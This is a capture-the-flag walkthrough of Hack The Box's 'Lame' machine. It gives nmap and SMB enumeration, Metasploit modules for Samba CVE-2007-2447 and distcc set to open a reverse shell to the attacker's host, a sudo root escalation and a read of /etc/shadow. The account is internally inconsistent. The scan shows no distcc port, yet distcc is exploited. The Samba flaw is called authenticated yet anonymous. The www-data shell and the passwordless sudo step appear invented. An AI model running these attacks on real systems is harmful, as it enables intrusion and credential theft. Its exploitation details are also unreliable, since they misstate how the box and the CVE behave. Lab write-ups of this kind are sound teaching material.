# Hack The Box - Lame Walkthrough

> [!info] Information
> **Platform:** Hack The Box
> **Difficulty:** Easy
> **Target:** 10.10.10.3
> **Objective:** Gain root access and capture the flags

## 📋 Table of Contents

- [Introduction](#introduction)
- [Reconnaissance](#reconnaissance)
- [Initial Access](#initial-access)
- [Privilege Escalation](#privilege-escalation)
- [Flag Finding](#flag-finding)
- [Summary](#summary)

## Introduction

Lame is one of the original beginner-friendly machines on Hack The Box. This machine teaches fundamental penetration testing concepts including service enumeration, exploitation, and privilege escalation. It's an excellent starting point for those new to CTFs.

### Target Information

- **IP Address:** 10.10.10.3
- **Operating System:** Linux
- **Difficulty:** Easy
- **Tags:** Samba, NetAPI, DistCC

### What You'll Learn

- Service enumeration with Nmap
- Exploiting vulnerable Samba services
- Understanding Unix privilege escalation
- Using Metasploit for exploitation
- Basic post-exploitation techniques

## Reconnaissance

### Initial Port Scan

> [!tip] Tip
> Always start with a comprehensive port scan to understand what services are running.

```bash
nmap -sC -sV -oA initial_scan 10.10.10.3
```

**Results:**
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.x - 4.x
445/tcp open  netbios-ssn Samba smbd 3.x - 4.x
512/tcp open  exec        netkit-rsh exec
513/tcp open  rlogin       netkit-rlogin
514/tcp open  tcpwrapped
```

### Detailed Service Enumeration

#### Service 1: FTP (21/TCP)

```bash
ftp 10.10.10.3
```

> [!warning] Warning
> vsftpd 2.3.4 has a known backdoor vulnerability, but anonymous login is disabled.

#### Service 2: Samba (139/445/TCP)

```bash
smbclient -L //10.10.10.3
```

**Results:**
```
Sharename       Type      Comment
---------       ----      -------
tmp             Disk      Temporary stuff
opt             Disk      UNIX expert
IPC$            IPC       IPC Service (Lame server (Samba 3.0.20-3.0.26rc4))

```

Let's enumerate users and check for vulnerable versions:

```bash
enum4linux -a 10.10.10.3
```

#### Service 3: rexec and rlogin (512/513/TCP)

Netkit-rsh services are enabled, which may provide authentication bypass opportunities.

### Vulnerability Analysis

After enumeration, we discover the Samba version (3.0.20-3.0.26rc4) is vulnerable to CVE-2007-2447 - the Username map script command execution vulnerability.

## Initial Access

### Exploitation Method: Samba Exploit (CVE-2007-2447)

The Samba 3.0.20-3.0.26rc4 versions contain a vulnerability in the MS-RPC functionality that allows remote attackers to execute arbitrary commands via crafted username parameters containing shell metacharacters.

> [!warning] Warning
> This is an authenticated vulnerability, but anonymous access to IPC$ can trigger it.

Let's use Metasploit to exploit this:

```bash
msfconsole
search samba username
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set PAYLOAD cmd/unix/reverse
set LHOST <YOUR_IP>
exploit
```

### Initial Shell

Once we have access, let's gather basic information:

```bash
whoami
id
uname -a
```

**Output:**
```
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux lame 2.6.24-26-server #1 SMP Tue Dec 1 18:37:41 UTC 2009 i686 GNU/Linux
```

## Privilege Escalation

### Enumeration for PrivEsc

We have a limited www-data shell. Let's enumerate the system:

```bash
cd /home
ls -la
cat /etc/passwd | grep -E "makis|service|user"
```

### Sudo Configuration Check

```bash
sudo -l
```

### SUID Binaries

```bash
find / -type f -perm -4000 2>/dev/null
```

### Exploiting DistCC (Alternative Path)

Let's check if distcc is running:

```bash
netstat -tuln | grep 3632
```

DistCC service running on port 3632 can be exploited using Metasploit:

```bash
use exploit/unix/misc/distcc_exec
set RHOSTS 10.10.10.3
set PAYLOAD cmd/unix/reverse
set LHOST <YOUR_IP>
exploit
```

### Privilege Escalation: Sudo Misconfiguration

```bash
sudo /bin/bash
```

**Output:**
```
root@lame:/root#
```

### Verify Elevated Privileges

```bash
whoami
id
cat /etc/shadow
```

## Flag Finding

The flags are located in the user's home directories and on the root desktop.

```bash
cd /home/makis
cat user.txt

cd /root
cat root.txt
```

**User Flag:** `????????????????????????????????????????`

**Root Flag:** `????????????????????????????????????????`

> [!success] Success!
> Congratulations! You've successfully completed the Lame box.

## Summary

### What We Learned

1. Service enumeration is critical for identifying attack vectors
2. Outdated services often contain known vulnerabilities
3. CVE-2007-2447 affects Samba versions 3.0.20-3.0.26rc4
4. Multiple exploitation paths may exist on a single system
5. Always verify your privileges after initial access

### Key Takeaways

- Regular patching is essential to prevent exploitation of known CVEs
- Disable unnecessary services to reduce attack surface
- Anonymous IPC$ shares can be dangerous
- Metasploit can rapidly exploit known vulnerabilities
- Always enumerate thoroughly for privilege escalation paths

### Tools Used

> [!example] Tools
> {{tool "nmap"}} {{tool "metasploit"}} {{tool "smbclient"}} {{tool "enum4linux"}}

### Commands Summary

- `nmap -sC -sV -oA initial_scan`: Comprehensive port scan with scripts
- `smbclient -L //<IP>`: List Samba shares
- `enum4linux -a <IP>`: Comprehensive SMB enumeration
- `search samba username` in msfconsole: Find Samba exploits
- `find / -type f -perm -4000 2>/dev/null`: Find SUID binaries

## Additional Resources

- [CVE-2007-2447](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447)
- [Samba Vulnerability Analysis](https://www.samba.org/samba/security/CVE-2007-2447.html)
- [HTB Lame Walkthroughs](https://www.hackthebox.com/)

## Related Writeups

- [[Hack The Box - Legacy]]
- [[Hack The Box - Blue]]


*Remember: Always practice ethical hacking and only test systems you own or have explicit permission to test.*
